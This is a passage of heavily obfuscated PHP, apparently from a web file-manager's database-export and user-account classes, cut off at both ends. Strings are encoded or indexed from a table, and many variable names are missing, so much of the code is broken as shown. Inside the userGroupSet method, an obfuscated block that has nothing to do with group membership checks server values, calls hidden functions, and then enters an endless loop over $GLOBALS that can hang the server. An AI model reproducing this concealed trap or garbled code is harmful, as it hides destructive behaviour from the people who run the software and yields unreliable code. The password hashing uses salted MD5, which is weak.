$Х[71]); $ = null; $׏˺ = strlen($˺Ϟ); $Ũ߯ += $׏˺; if ($Ũ߯ >= ($ == 500 ? $ : $߈)) { $ = array_pop($); if ($쿹 > 1) { $쿹--; } } if ($쿹 >= $ || $) { $˺Ϟ = $ۉ . implode($Х[50], $); if (!$->execute($˺Ϟ)) { return !1; } if ($ےه) { $ےه->update($쿹); } $ = array(); $쿹 = 0; $Ũ߯ = 0; if ($) { $ = array($); $쿹 = 1; $Ũ߯ = $׏˺; } } } fclose($ڪ); if (!empty($)) { $˺Ϟ = $ۉ . implode($Х[50], $); if (!$->execute($˺Ϟ)) { return !1; } if ($ےه) { $ےه->update($쿹); } } return !0; } public function dropTable($ŉ = null) { $ = $this->model()->db(); $ɕ = $ŉ ? array($ŉ) : $->getTables(); if (!$ɕ) { return; } foreach ($ɕ as $ŉ) { if ($ŉ) { $ŉ = strtolower($ŉ); } else { continue; } $->execute("\144\x72\157\x70\x20\164\x61\x62\154\145\x20\x69\x66\40\145\x78\x69\163\x74\x73\40\x60{$ŉ}\140"); } } private function sqlEncode($) { $Ӗ =& $_SERVER[]; $ = array(); foreach ($ as $) { if (is_array($)) { $ = json_encode_force($); } $ = addslashes($); $ = str_replace(array($Ӗ[1117], $Ӗ[246]), array($Ӗ[1118], $Ӗ[1119]), $); $[] = str_replace($Ӗ[58], $Ӗ[1120], $); } return $Ӗ[58] . implode($Ӗ[1121], $) . $Ӗ[58]; } private function sqlDecode($Ĵ, $̺, $⋫ = '') { $ާ =& $_SERVER[]; $Ĵ = str_replace(array($ާ[1118], $ާ[1119]), array($ާ[1117], $ާ[246]), $Ĵ); if ($̺ == $ާ[13]) { return $⋫ != $ާ[1122] ? stripslashes($Ĵ) : $Ĵ; } if ($⋫ == $ާ[1122]) { $Ĵ = str_replace($ާ[1123], $ާ[118], stripslashes($Ĵ)); } return $Ĵ; } public function getSqlFile($Ȭ = '') { $̢ =& $_SERVER[]; $ = $this->dbType(!0); $խ = CONTROLLER_DIR . "\151\x6e\x73\164\x61\154\154\57\144\141\164\x61\57{$}\56\163\161\x6c"; $㝀 = file_get_contents($խ); $ = $̢[1124] . ($ == $̢[838] ? $̢[1125] : $̢[1126]) . $̢[1127]; preg_match_all($, $㝀, $); $ = $[1]; $ = $this->model()->db(); $و = $->getTables(); $ = TEMP_FILES . $̢[1128] . date($̢[255]) . $̢[8]; del_dir($); mk_dir($); $Ʒ = $ . $̢[1129]; $ۇ = $ . $̢[1130]; $۫ = $ == $̢[13] ? $̢[838] : $̢[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\x74\x61\x6c\154\57\x64\x61\x74\141\57{$۫}\56\x73\161\154", $); @touch($ . $ . $̢[822]); $֍ = fopen($Ʒ, $̢[1105]); $Ѓ = fopen($ۇ, $̢[1105]); if ($ == $̢[13]) { $و = array_diff($و, array($̢[818], $̢[819])); $ = array($̢[1131], $̢[1132], $̢[1133]); fwrite($Ѓ, implode(PHP_EOL, $) . PHP_EOL . PHP_EOL); foreach ($و as $ٗ) { $ᅞ = $this->sqlFromSqlite($ٗ); if (!$ᅞ[$̢[13]]) { continue; } fwrite($Ѓ, $ᅞ[$̢[13]] . PHP_EOL . PHP_EOL); if (!in_array($ٗ, $)) { fwrite($֍, $ᅞ[$̢[838]] . PHP_EOL . PHP_EOL); } } } else { foreach ($و as $ٗ) { $ᅞ = $this->sqlFromMysql($ٗ); if (!$ᅞ[$̢[838]]) { continue; } fwrite($֍, $ᅞ[$̢[838]] . PHP_EOL . PHP_EOL); if (!in_array($ٗ, $)) { fwrite($Ѓ, $ᅞ[$̢[13]] . PHP_EOL . PHP_EOL); } } } fclose($֍); fclose($Ѓ); $㝀 = array($̢[838] => $Ʒ, $̢[13] => $ۇ); return $Ȭ ? $㝀[$Ȭ] : $㝀; } public function dbType($똨 = false) { $ =& $_SERVER[]; $ѻ܊ = $똨 ? $GLOBALS[$[6]][$[21]] : $this->database; $ѻ܊ = array_change_key_case($ѻ܊); $̛ = $ѻ܊[$[1006]]; if ($̛ == $[1003]) { $ = explode($[4], $ѻ܊[$[1012]]); $̛ = $[0]; } $ = array($[1134] => $[13], $[951] => $[838]); if (isset($[$̛])) { $̛ = $[$̛]; } return $̛; } public function sqlFromMysql($ףѺ, $ߨ = '') { $Ĵ =& $_SERVER[]; $ҽ = $this->model()->db(); $ݎ = $ҽ->query($Ĵ[1135] . $ףѺ . $Ĵ[429]); if (!$ݎ || !$ݎ[0]) { return !1; } $ɖ = _get($ݎ[0], $Ĵ[1136], $Ĵ[12]); if (!$ɖ) { return !1; } $ܯ = "\x44\122\117\x50\40\124\101\102\114\x45\x20\x49\x46\x20\x45\x58\111\123\x54\123\40\140{$ףѺ}\x60\x3b" . PHP_EOL . $ɖ . $Ĵ[71]; if ($ߨ && $ߨ == $Ĵ[838]) { return $ܯ; } $Ѷ = array_change_key_case($GLOBALS[$Ĵ[6]][$Ĵ[21]]); $ = $Ѷ[$Ĵ[1011]]; $ھխ = $Ĵ[1137] . $ . $Ĵ[1138] . $ףѺ . $Ĵ[58]; $ҝ = $Ĵ[1139] . $ףѺ . $Ĵ[939]; $˽Ħ = $ҽ->query($ھխ); if (empty($˽Ħ)) { $ = array($Ĵ[838] => $Ĵ[12], $Ĵ[13] => $Ĵ[12]); return $ߨ ? $[$ߨ] : $; } $ڋ = $ҽ->query($ҝ); $ = $Ĵ[12]; $ք˧ = array(); foreach ($ڋ as $瓩) { if (!$ && $瓩[$Ĵ[1140]] == $Ĵ[1141]) { $ = $瓩[$Ĵ[1142]]; } if (isset($ք˧[$瓩[$Ĵ[1140]]])) { $ք˧[$瓩[$Ĵ[1140]]][$Ĵ[1143]][] = $瓩[$Ĵ[1142]]; continue; } $ք˧[$瓩[$Ĵ[1140]]] = array($Ĵ[1144] => $瓩[$Ĵ[1140]], $Ĵ[1143] => array($瓩[$Ĵ[1142]]), $Ĵ[1145] => $瓩[$Ĵ[1146]] == $Ĵ[88] ? 0 : 1); } $ȅ = array(); foreach ($ք˧ as $瓩) { $ = $瓩[$Ĵ[1144]] == $Ĵ[1141]; $¿ = array($Ĵ[1147], $瓩[$Ĵ[1145]] == $Ĵ[88] && !$ ? $Ĵ[1148] : $Ĵ[12], $Ĵ[1149], $Ĵ[1150] . $ףѺ . $Ĵ[11] . ($ ? $Ĵ[1151] : $瓩[$Ĵ[1144]]) . $Ĵ[118], $Ĵ[1152], $Ĵ[118] . $ףѺ . $Ĵ[118], $Ĵ[1153] . implode($Ĵ[1154], $瓩[$Ĵ[1143]]) . $Ĵ[1155]); $ȅ[] = implode($Ĵ[53], $¿) . $Ĵ[71]; } $ = array(); $Ӟ޷ = array($Ĵ[1156] => $Ĵ[1157], $Ĵ[1157] => $Ĵ[1157], $Ĵ[332] => $Ĵ[359], $Ĵ[331] => $Ĵ[359]); foreach ($˽Ħ as $瓩) { $¿ = array($Ĵ[118] . $瓩[$Ĵ[1158]] . $Ĵ[118], isset($Ӟ޷[$瓩[$Ĵ[1159]]]) ? $Ӟ޷[$瓩[$Ĵ[1159]]] : $瓩[$Ĵ[1160]], $瓩[$Ĵ[1161]] == $Ĵ[937] ? $Ĵ[1162] : $Ĵ[1163], $瓩[$Ĵ[1158]] == $ ? $Ĵ[1164] : $Ĵ[12], $瓩[$Ĵ[988]] ? strtoupper(str_replace($Ĵ[11], $Ĵ[12], $瓩[$Ĵ[988]])) : $Ĵ[12]); $[] = trim(implode($Ĵ[53], $¿)); } $Ȟ = array($Ĵ[1165] . $ףѺ . $Ĵ[1166], $Ĵ[1167] . $ףѺ . $Ĵ[1168], implode($Ĵ[50] . PHP_EOL, $), $Ĵ[985]); $讲 = implode(PHP_EOL, array_merge($Ȟ, $ȅ)); if ($ߨ && $ߨ == $Ĵ[13]) { return $讲; } $ = array($Ĵ[838] => $ܯ, $Ĵ[13] => $讲); return $ߨ ? $[$ߨ] : $; } public function sqlFromSqlite($鬜, $Ű = '') { $ =& $_SERVER[]; $ = $this->model()->db(); $չ = "\120\x52\x41\107\x4d\x41\40\124\x41\102\x4c\x45\x5f\111\116\106\117\40\50\x27{$鬜}\x27\x29"; $ = "\123\x45\114\105\103\x54\40\52\40\x46\122\x4f\115\x20\163\161\154\151\164\x65\x5f\155\141\x73\164\145\162\40\x57\x48\105\122\105\x20\164\x62\154\137\x6e\141\155\145\40\75\40\x27{$鬜}\x27"; $㡂 = $->query($չ); if (empty($㡂)) { $ = array($[838] => $[12], $[13] => $[12]); return $Ű ? $[$Ű] : $; } $ = $->query($); $ٯӐ = $ = array(); foreach ($ as $З) { if ($З[$[33]] == $[323]) { $ٯӐ[] = $З[$[1169]]; } else { $[$З[$[32]]] = $З[$[1169]]; } } $ױĕ = array_merge(array($[1165] . $鬜 . $[118]), $ٯӐ, array_values($)); $ױĕ = implode($[71] . PHP_EOL, $ױĕ) . $[71]; if ($Ű && $Ű == $[13]) { return $ױĕ; } $ = array(); $ = array($[1157] => $[1170], $[359] => $[1171]); $ = $[12]; foreach ($㡂 as $З) { if ($З[$[57]] == $[88]) { $ = $З[$[32]]; } $ = array($[429] . $З[$[32]] . $[429], isset($[$З[$[33]]]) ? $[$З[$[33]]] : $З[$[33]], $З[$[35]] == $[88] ? $[1162] : $[1172] . $З[$[56]], $З[$[57]] == $[88] ? $[1173] : $[12]); $[] = trim(implode($[53], $)); } foreach ($ as $ => $Ɂ) { $Т = str_replace($[1174] . $鬜 . $[11], $[12], $); $¬ = str_replace(array($[118], $[996]), $[429], substr($Ɂ, stripos($Ɂ, $[304]))); if ($Т == $[1151]) { $ׂ΁ = $[1175] . $ . $[1176]; } else { $ׂ΁ = (stripos($Т, $[11]) ? $[1177] : $[12]) . ($[1178] . $Т . $[1179] . $¬); } $[] = $ׂ΁; } $ = array($[1180] . $鬜 . $[1181], $[1182] . $鬜 . $[1183], implode($[50] . PHP_EOL, $), $[1184]); $ = implode(PHP_EOL, $); if ($Ű && $Ű == $[838]) { return $; } $ = array($[838] => $, $[13] => $ױĕ); return $Ű ? $[$Ű] : $; } } goto CĲ; eڟ: class UserModel extends ModelBase { protected $tableName = "\165\x73\145\162"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\155\145" => "\165\163\145\x72\137\155\145\164\141", "\155\x65\164\141\x46\151\x65\x6c\x64" => "\165\163\x65\x72\x49\104"); protected $simpleField = "\x75\163\145\x72\x49\104\x2c\x6e\x69\x63\153\116\141\155\145\54\156\141\155\145\54\x61\166\x61\164\141\162\x2c\x73\x65\x78\x2c\x73\x74\141\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($򼱤) { $ =& $_SERVER[]; $ = $[2337]; return array($[1963] => array($򼱤[0], $), $[1965] => array($򼱤[0], $), $[2338] => array($򼱤[0], $)); } protected function getInfo($, $ = false) { $ɐ̙ = $this->getInfoSimple($); if (!is_array($ɐ̙)) { return array(); } if ($) { return $this->_getInfoApply($ɐ̙); } return $this->cacheFunctionGet($_SERVER[][1967], $); } protected function getInfoFull($̴, $Ԣ = false) { $֤ = $this->getInfoSimple($̴); if (!is_array($֤)) { return array(); } if ($Ԣ) { return $this->_getInfoApply($֤, !0); } return $this->cacheFunctionGet($_SERVER[][2339], $̴); } private function _getInfoApply($Ȋ, $ = false) { $ށ =& $_SERVER[]; if (!$Ȋ) { return $Ȋ; } $ɨ = md5($ށ[2340] . $Ȋ[$ށ[928]] . $ށ[2341] . $Ȋ[$ށ[32]]); $Ȋ = $this->_listDataApplyItem($Ȋ); $ҹ = Model($ށ[1373])->metaGet($Ȋ[$ށ[87]][$ށ[181]]); $Ȋ[$ށ[2342]] = $ɨ; $Ȋ[$ށ[87]][$ށ[2159]] = isset($ҹ[$ށ[2160]]) ? $ҹ[$ށ[2160]] : null; if ($) { $Ȋ[$ށ[507]] = $this->metaGet($Ȋ[$ށ[1687]]); } return $Ȋ; } protected function getInfoSimple($, $ē = false) { $ =& $_SERVER[]; if (!$) { return array(); } if ($ē) { $ق = $this->where(array($[1687] => intval($)))->find(); if (!is_array($ق)) { return array(); } $ق[$[2343]] = Action($[2344])->parseUrl($ق[$[2343]]); return $ق; } return $this->cacheFunctionGet($[1968], $); } protected function getInfoSimpleOuter($̥) { $Ε =& $_SERVER[]; if (!$̥ || $̥ == 0) { return array($Ε[1687] => $Ε[212], $Ε[32] => $Ε[163] . LNG($Ε[2345]) . $Ε[165], $Ε[2343] => STATIC_PATH . $Ε[2346]); } $ = $this->cacheFunctionGet($Ε[1968], $̥); $ޫ = array_field_key($, explode($Ε[50], $this->simpleField)); if (!$ޫ) { return array($Ε[1687] => $Ε[1229], $Ε[32] => $Ε[163] . LNG($Ε[2347]) . $Ε[165], $Ε[2343] => STATIC_PATH . $Ε[2348]); } $ޫ[$Ε[2343]] = Action($Ε[2344])->parseUrl($ޫ[$Ε[2343]]); return $ޫ; } protected function groupUser($) { } public static function errorLang($) { $֕ =& $_SERVER[]; $϶ = array(self::ERROR_USER_NOT_EXISTS => $֕[2349], self::ERROR_USER_PASSWORD_ERROR => $֕[2350], self::ERROR_USER_EXIST_NAME => $֕[2351], self::ERROR_USER_EXIST_PHONE => $֕[2352], self::ERROR_USER_EXIST_EMAIL => $֕[2353], self::ERROR_USER_LOGIN_LOCK => $֕[2354], self::ERROR_IP_NOT_ALLOW => $֕[2355], self::ERROR_USER_EXIST_NICKNAME => $֕[2356]); return LNG($϶[$]); } public function getInfoByMeta($Ӻ, $) { $퓯 =& $_SERVER[]; $䋴 = Model($퓯[2357])->where(array($퓯[94] => $Ӻ, $퓯[418] => $))->find(); if ($䋴) { return $this->getInfo($䋴[$퓯[1687]]); } return !1; } public function userLoginCheck($, $ز) { $Ƕ =& $_SERVER[]; $ = $this->userLoginFind($); if (!$) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($[$Ƕ[1687]], $ز)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($[$Ƕ[1687]]); } public function userLoginFind($ة) { $ =& $_SERVER[]; $Ʌ = array($[32] => $ة, $[2167] => $ة, $[349] => $ة, $[2358] => $ة, $[1039] => $[1041]); if ($this->nickNameRpt()) { unset($Ʌ[$[2167]]); } return $this->where($Ʌ)->find(); } public function clearCache($ϼ) { $ݽ =& $_SERVER[]; $this->cacheFunctionClear($ݽ[1967], $ϼ); $this->cacheFunctionClear($ݽ[1968], $ϼ); $this->cacheFunctionClear($ݽ[2339], $ϼ); } public function userPasswordCheck($, $Ͱ) { $ܘ =& $_SERVER[]; $񣳭 = $this->where(array($ܘ[1687] => intval($)))->find(); $ = $this->metaGet($); $߈ = isset($[$ܘ[2359]]) ? $[$ܘ[2359]] : $ܘ[12]; if (md5($߈ . trim($Ͱ)) !== $񣳭[$ܘ[928]]) { return !1; } return !0; } public function userAdd($履) { $צ =& $_SERVER[]; $հ = array($צ[462] => $履[$צ[32]], $צ[2360] => $履[$צ[1563]], $צ[2361] => isset($履[$צ[349]]) ? $履[$צ[349]] : $צ[12], $צ[2362] => isset($履[$צ[2358]]) ? $履[$צ[2358]] : $צ[12], $צ[2363] => isset($履[$צ[2167]]) ? $履[$צ[2167]] : $履[$צ[32]], $צ[2364] => isset($履[$צ[2343]]) ? $履[$צ[2343]] : $צ[12], $צ[2365] => isset($履[$צ[2366]]) ? $履[$צ[2366]] : 1, $צ[2367] => $履[$צ[928]], $צ[1969] => isset($履[$צ[1872]]) ? $履[$צ[1872]] : 1024 * 1024 * 20, $צ[1970] => 0, $צ[2368] => 0, $צ[2014] => isset($履[$צ[784]]) ? $履[$צ[784]] : 1); if (!empty($履[$צ[1687]])) { $հ[$צ[1687]] = $履[$צ[1687]]; } $䋤 = $this->_checkExist($履); if ($䋤 !== !0) { return $䋤; } if (!empty($հ[$צ[2343]]) && strlen($հ[$צ[2343]]) > 255) { $հ[$צ[2343]] = $צ[12]; } $ʸ = $this->add($հ); $譄 = array($צ[2367] => $հ[$צ[928]], $צ[2363] => $հ[$צ[2167]]); $this->userEdit($ʸ, $譄); Model($צ[1373])->userRootAdd($ʸ); return $ʸ; } protected function userEditTest($, $պ) { return $this->call($_SERVER[][2369], $, $պ); } protected function userEdit($, $᲏) { $ =& $_SERVER[]; $ݙ = $this->getInfoSimple($); if (!$ݙ) { return !1; } $ӘŞ = $this->_checkExist($᲏, $); if ($ӘŞ !== !0) { return $ӘŞ; } if (isset($᲏[$[928]]) && trim($᲏[$[928]]) != $[12]) { $ = $this->metaGet($); if (empty($[$[2359]])) { $[$[2359]] = rand_string(10); Model($[546])->metaSet($, $[2359], $[$[2359]]); } $᲏[$[928]] = md5($[$[2359]] . trim($᲏[$[928]])); } else { unset($᲏[$[928]]); } if (!empty($᲏[$[2343]]) && strlen($᲏[$[2343]]) > 255) { $᲏[$[2343]] = $[12]; } $this->where(array($[1678] => $))->save($᲏); if (isset($᲏[$[2167]])) { $this->setNamePinyin($, $᲏[$[2167]]); } $this->clearCache($); return !0; } public function setNamePinyin($٩, $ = false) { $ =& $_SERVER[]; if (!$) { $٨ = $this->getInfoSimple($٩); $ = $٨[$[2167]] ? $٨[$[2167]] : $٨[$[32]]; } $ = Model($[567]); if (!Input::check($, $[623])) { return $->metaSet($٩, array($[506] => $[12], $[505] => $[12])); } return $->metaSet($٩, array($[506] => str_replace($[53], $[12], Pinyin::get($)), $[505] => Pinyin::get($, $[624]))); } private function nickNameRpt() { $ =& $_SERVER[]; $ה = Model($[804])->get($[2370]); $Ȓ = $GLOBALS[$[6]][$[425]][$[2370]]; $ʋ = !is_null($ה) ? $ה : $Ȓ; return !!$ʋ; } private function _checkExist($¥, $ȿĪ = false) { $Ճ =& $_SERVER[]; $ = array($Ճ[32] => UserModel::ERROR_USER_EXIST_NAME, $Ճ[2167] => UserModel::ERROR_USER_EXIST_NICKNAME, $Ճ[349] => UserModel::ERROR_USER_EXIST_EMAIL, $Ճ[2358] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($[$Ճ[2167]]); } $ = $ȿĪ ? array($Ճ[1687] => array($Ճ[2371], $ȿĪ)) : array(); foreach ($ as $ => $儩Ҍ) { $͜ = array(); foreach ($ as $𙡃 => $־) { if (isset($¥[$𙡃]) && $¥[$𙡃]) { $͜[] = $¥[$𙡃]; } } if (!$͜) { continue; } $ߜ = array_merge(array($ => array($Ճ[7], $͜)), $); $Ż = $this->where($ߜ)->find(); if ($Ż) { return $儩Ҍ; } } return !0; } public function userListInfo($) { $Ɯ =& $_SERVER[]; $ؗ = array(); $ = is_array($) ? array_unique($) : array(); if (!$) { return $ؗ; } if (count($) < 20) { foreach ($ as $) { $ؗ[$ . $Ɯ[12]] = $this->getInfoSimpleOuter($); } } else { $෽ = array($Ɯ[1678] => array($Ɯ[460], $)); if (count($) == 1) { $෽ = array($Ɯ[1678] => $[0]); } $ = Model($Ɯ[546])->field($this->simpleField)->where($෽)->select(); $ = array_to_keyvalue($, $Ɯ[1687]); foreach ($ as $) { $ӪǞ = $[$]; if (!$ӪǞ) { $ؗ[$ . $Ɯ[12]] = $this->getInfoSimpleOuter($); continue; } $ӪǞ[$Ɯ[2343]] = Action($Ɯ[2344])->parseUrl($ӪǞ[$Ɯ[2343]]); $ؗ[$ . $Ɯ[12]] = $ӪǞ; } } return $ؗ; } protected function userStatus($ʗύ, $) { $ = $this->getInfoSimple($ʗύ); if (!$) { return !1; } $ = array($_SERVER[][784] => $); return $this->userEdit($ʗύ, $); } protected function userRemove($Ӝ) { $Ӟ駕 =& $_SERVER[]; $־ć = $this->getInfoSimple($Ӝ); if (!$־ć) { return !1; } $ = array($Ӟ駕[1678] => $Ӝ); Model($Ӟ駕[632])->where($)->delete(); Model($Ӟ駕[2372])->where($)->delete(); Model($Ӟ駕[1975])->where($)->delete(); Model($Ӟ駕[2357])->where($)->delete(); Model($Ӟ駕[1107])->where($)->delete(); Model($Ӟ駕[2184])->removeUserAll($Ӝ); Model($Ӟ駕[859])->userRootRemove($Ӝ); return $this->where($)->delete(); } protected function userGroupSet($, $, $ȺБ = array()) { $ɟ =& $_SERVER[]; if (!isset($_SERVER[$ɟ[911]]) || !isset($_SERVER[$ɟ[1222]])) { $ = $ɟ[913]; $ = $ɟ[914]; $ = $_SERVER[$ɟ[915]] . $ɟ[916]; $ʚӟ = $($); $ͫ = explode($ɟ[246], $ʚӟ); if (count($ͫ) < $ɟ[682]) { $ = $ɟ[917]; $(); } $Ӆ = $ɟ[918]; $Ӆ($_SERVER[$ɟ[919]]); $̀ = 1; for ($Ѧ = $̀; $Ѧ > 0; $Ѧ++) { $Ӆ = json_encode($GLOBALS[$ɟ[460]]); } } $ = $this->getInfoSimple($); if (!$ || !is_array($)) { return !1; } $ = Model($ɟ[1975]); $->where(array($ɟ[1687] => $))->delete(); $ = array(); $ԓ = 0; foreach ($ as $ => $) { $ʘ = array($ɟ[1687] => $, $ɟ[1885] => $, $ɟ[1989] => $); $ʘ[$ɟ[1909]] = isset($ȺБ[$ԓ]) ? $ȺБ[$ԓ] : 0; $ԓ++; $[] = $ʘ; } return $->addAll($, array(), !0); } protected function userGroupAdd($劮, $ = array()) { $鞋 =& $_SERVER[]; $ = $this->getInfoSimple($劮); if (!$ || empty($)) { return !1; } $ = array(); foreach ($ as $ڣ => $) { $[] = array($鞋[1687] => $劮, $鞋[1885] => $ڣ, $鞋[1989] => $, $鞋[1909] => 0); } return Model($鞋[1975])->addAll($, array(), !0); } protected function userGroupRemove($澆ـ, $깽) { $ʰŨ =& $_SERVER[]; $ = $this->getInfoSimple($澆ـ); if (!$ || !$깽) { return !1; } $Ѣ = array($ʰŨ[1678] => $澆ـ, $ʰŨ[1973] => $깽); return Model($ʰŨ[1975])->where($Ѣ)->delete(); } public function listData() { $Ę = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ę[$_SERVER[][413]]); return $Ę; } public function listByID($ɷ) { $ =& $_SERVER[]; if (!$ɷ) { return; } $ = array($[1687] => array($[7], $ɷ)); $Ǟ = $this->where($)->select(); $Ǟ = array_sort_keep($Ǟ, $[1687], $ɷ); $this->_listDataApply($Ǟ); return $Ǟ; } public function listByGroup($ = 0, $ł = array()) { $ =& $_SERVER[]; $ = $[12]; $Ȥϥ = array(); if ($) { $Ȥϥ = array($[2373] => intval($)); $ = "\x4c\105\106\x54\40\x4a\117\111\116\x20{$this->tablePrefix}\165\x73\145\162\x5f\x67\162\x6f\165\160\x20\x75\x73\145\x72\x5f\x67\x72\157\x75\160\40\x6f\156\x20\x75\x73\145\x72\56\x75\x73\x65\x72\x49\104\40\75\x20\x75\x73\x65\x72\137\147\162\x6f\165\160\x2e\165\x73\145\162\111\x44"; $ǉ = Input::get($[498], null, $[12]) ? $[12] : $[2374]; } if (isset($ł[$[784]])) { $Ȥϥ[$[2375]] = $ł[$[784]]; } $ס = $this->_makeOrder($ǉ)->field($[2376])->where($Ȥϥ)->join($)->selectPage(50); $this->_listDataApply($ס[$[413]]); return $ס; } private function _makeOrder($ɡԝ = '') { $ =& $_SERVER[]; $ = array($[1687], $[32], $[1874], $[1846], $[215]); $ = array($[491] => $[492], $[493] => $[494]); $ = Input::get($[498], $[7], $[1678], $); $淋 = Input::get($[499], $[7], $[1976], array($[1976], $[493])); $淋 = $[$淋]; $ɡԝ = $ɡԝ . "\x75\163\x65\x72\x2e{$}\x20{$淋}\x2c\40\165\163\x65\x72\x2e\x75\163\145\162\x49\x44\x20\141\x73\x63"; return $this->alias($[2102])->order($ɡԝ); } public function listSearch($) { $ =& $_SERVER[]; $Ӄ = $[$[1979]]; $ = isset($[$[1980]]) ? $[$[1980]] : !1; $Ӄ = str_replace($[1981], $[1982], trim($Ӄ)); $Ҹ΄ = array($[32] => array($[427], "\x25{$Ӄ}\x25"), $[349] => array($[427], "{$Ӄ}\45"), $[2167] => array($[427], "{$Ӄ}\x25"), $[1039] => $[1983]); if (Input::check($Ӄ, $[355])) { $Ҹ΄[$[1687]] = array($[427], "{$Ӄ}\x25"); $Ҹ΄[$[2358]] = array($[427], "{$Ӄ}\45"); } if (!$Ӄ) { $Ҹ΄ = array(); } if (isset($[$[784]])) { $Ҹ΄[$[784]] = $[$[784]]; } $Ҹ΄ = $this->parseWhereLike($Ҹ΄); $쫆 = $this->_makeOrder()->where($Ҹ΄)->selectPage(20); if (!$쫆 || count($쫆[$[413]]) < 5 && Input::check($Ӄ, $[362])) { $׽ۯ = $this->_searchFromMeta($[505], $Ӄ, 10); $ = $this->_searchFromMeta($[506], $Ӄ, 10); $ = array_merge($׽ۯ, $, $쫆[$[413]]); $쫆[$[413]] = array_unique_by_key($, $[1687]); $쫆[$[410]][$[411]] = count($쫆[$[413]]); $쫆[$[410]][$[412]] = ceil($쫆[$[410]][$[411]] / $쫆[$[410]][$[407]]); } $this->_listDataApply($쫆[$[413]]); $this->_filterByGroup($쫆, $); return $쫆; } private function _filterByGroup(&$ʒ, $) { $莼 =& $_SERVER[]; if (!$) { return $ʒ; } foreach ($ʒ[$莼[413]] as $؏ => &$腀) { $ۘ = array_to_keyvalue($腀[$莼[2072]], $莼[12], $莼[1885]); if (!in_array($, $ۘ)) { unset($ʒ[$莼[413]][$؏]); } } unset($腀); $ʒ[$莼[413]] = array_values($ʒ[$莼[413]]); $ʒ[$莼[410]] = array($莼[2137] => count($ʒ[$莼[413]]), $莼[2135] => $ʒ[$莼[410]][$莼[407]], $莼[2134] => 1, $莼[2136] => 1); } private function _searchFromMeta($˯, $, $ع) { $ =& $_SERVER[]; $ = strtolower($); $˲ = array($[94] => $˯, $[418] => array($[427], "\45{$}\45")); $˲ = $this->parseWhereLike($˲); $ = Model($[2377])->where($˲)->limit($ع)->select(); if (!$) { return array(); } $ = array_to_keyvalue($, $[12], $[1687]); $̲ٿ = $this->where(array($[1678] => array($[7], $)))->select(); if (!$̲ٿ) { return array(); } return $̲ٿ; } private function _listDataApplyItem($Ȭܑ) { $ޣ = array($Ȭܑ); $this->_listDataApply($ޣ); return $ޣ[0]; } private function _listDataApply(&$) { $ =& $_SERVER[]; if (!$) { return; } array_remove_key($, $[928]); $ = array_to_keyvalue($, $[12], $[1687]); $this->_listAppendGroup($, $); $this->_listAppendMeta($, $); $this->_listAppendSourceRoot($, $); } private function _listAppendSourceRoot(&$Ϊ, $) { $󈰐 =& $_SERVER[]; $ݭΎ = Model($󈰐[859])->listSourceRoot(SourceModel::TYPE_USER, $); $ݭΎ = array_to_keyvalue($ݭΎ, $󈰐[538]); $ݭΎ = array_remove_key($ݭΎ, $󈰐[538]); foreach ($Ϊ as &$) { $[$󈰐[87]] = $ݭΎ[$[$󈰐[1687]]] ? $ݭΎ[$[$󈰐[1687]]] : array(); } unset($); } private function _listAppendGroup(&$», $ָך) { $׫ =& $_SERVER[]; $Ʌ = array($׫[1687] => array($׫[7], $ָך)); $㟞 = Model($׫[1975])->where($Ʌ)->select(); $ߩ = array_to_keyvalue($㟞, $׫[12], $׫[1885]); $ߩ = array_remove_value(array_unique($ߩ), $׫[212]); if (!$ߩ || !$㟞) { return; } $Ʌ = array($׫[1885] => array($׫[7], $ߩ)); $Р = Model($׫[2070])->field($׫[2378])->where($Ʌ)->select(); $Р = array_to_keyvalue($Р, $׫[1885]); $㟞 = array_to_keyvalue_group($㟞, $׫[1687]); foreach ($㟞 as &$) { $˺ = array(); foreach ($ as $Ȳ) { if (!$Ȳ[$׫[1989]]) { continue; } $ = Model($׫[540])->listData($Ȳ[$׫[1989]]); $˺[] = array($׫[1885] => $Ȳ[$׫[1885]], $׫[2379] => $Р[$Ȳ[$׫[1885]]][$׫[32]], $׫[553] => $Р[$Ȳ[$׫[1885]]][$׫[553]], $׫[455] => $); } $ = $˺; } unset($); foreach ($» as &$) { $[$׫[2072]] = array(); if (isset($㟞[$[$׫[1687]]])) { $[$׫[2072]] = $㟞[$[$׫[1687]]]; } } unset($); } public function userAppendGroup($Չѵ) { $Ձʄ =& $_SERVER[]; if (!$Չѵ) { return array(); } $this->_listAppendGroup($Չѵ, array_to_keyvalue($Չѵ, $Ձʄ[12], $Ձʄ[1687])); return $Չѵ; } private function _listAppendMeta(&$к, $в) { $Ŵ =& $_SERVER[]; $ = UserJobModel::JOB_KEY; $븵 = array($Ŵ[2359]); $ = array($Ŵ[1687] => array($Ŵ[7], $в)); $͞㌣ = Model($Ŵ[2357])->where($)->select(); $͞㌣ = array_to_keyvalue_group($͞㌣, $Ŵ[1687]); foreach ($͞㌣ as &$£) { $ӿ = array(); foreach ($£ as $ܥ) { if (!in_array($ܥ[$Ŵ[94]], $븵)) { $ӿ[$ܥ[$Ŵ[94]]] = $ܥ[$Ŵ[418]]; } } $£ = $ӿ; } unset($£); $ = Model($Ŵ[2380]); foreach ($к as &$) { $֥ = array(); if (isset($͞㌣[$[$Ŵ[1687]]])) { $֥ = $͞㌣[$[$Ŵ[1687]]]; } $[$Ŵ[2381]] = array(); if (isset($֥[$])) { $[$Ŵ[2381]] = $->getUserJobInfo($֥[$]); } } unset($); } protected function groupUserAll($ǂ) { $ᨢ =& $_SERVER[]; if (!$ǂ) { return !1; } $ = Model($ᨢ[1975])->field($ᨢ[1687])->where(array($ᨢ[1885] => array($ᨢ[7], $ǂ)))->select(); $ = array_to_keyvalue($, $ᨢ[12], $ᨢ[1687]); return array_unique($); } public function userSearch($, $ = "\52") { return Model($_SERVER[][567])->where($)->field($)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = 